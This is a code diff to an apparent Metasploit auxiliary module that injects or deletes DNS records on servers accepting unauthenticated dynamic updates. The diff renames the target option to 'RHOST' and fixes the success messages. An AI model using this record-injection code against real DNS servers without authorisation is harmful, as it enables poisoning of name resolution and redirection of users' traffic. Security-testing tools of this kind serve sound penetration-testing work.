@@ -30,7 +30,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options([
       OptString.new('DOMAIN', [true, 'The domain name']),
-      OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
+      OptAddress.new('RHOST', [true, 'The vulnerable DNS server IP address']),
       OptString.new('HOSTNAME', [true, 'The name record you want to inject']),
       OptAddress.new('IP', [true, 'The IP you want to assign to the injected record']),
       OptString.new('VALUE', [true, 'The string to be injected with TXT or CNAME record', 'w00t']),
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
     # Send the update to the zone's primary master.
     domain = datastore['DOMAIN']
     fqdn   = "#{datastore['HOSTNAME']}.#{domain}"
-    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
+    resolver = Dnsruby::Resolver.new({:nameserver => datastore['RHOST']})
     update   = Dnsruby::Update.new(domain)
     case
       when action.name == 'ADD'
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
         update.add("#{fqdn}.", type_enum, 86400, value)
         begin
           resolver.send_message(update)
-          print_good("The record '#{fqdn} => #{ip}' has been added!")
+          print_good("The record '#{fqdn} => #{value}' has been added!")
         rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet, Dnsruby::NXDomain => e
           print_error "Cannot inject #{fqdn}. The DNS server may not be vulnerable or the hostname may exist as a static record."
           vprint_error "Update failed: #{e.message}"
@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
           update.present(fqdn, type)
           update.delete(fqdn, type)
           resolver.send_message(update)
-          print_good("The record '#{fqdn} => #{ip}' has been deleted!")
+          print_good("The record '#{fqdn} => #{value}' has been deleted!")
         rescue Dnsruby::YXRRSet, Dnsruby::NXRRSet => e
           print_error "Cannot delete #{fqdn}. DNS server is vulnerable or domain doesn't exist."
           vprint_error "Update failed: #{e.message}"
